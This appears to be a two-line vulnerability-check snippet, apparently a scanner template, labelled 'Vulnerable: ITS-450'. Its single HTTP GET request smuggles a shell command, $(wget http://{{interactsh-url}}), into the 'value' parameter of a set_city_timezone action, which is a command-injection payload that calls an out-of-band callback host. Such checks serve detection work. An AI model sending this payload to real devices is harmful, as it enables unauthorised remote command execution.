# Vulnerable: ITS-450
GET /?action=command&command=set_city_timezone&value=$(wget%20http://{{interactsh-url}}))
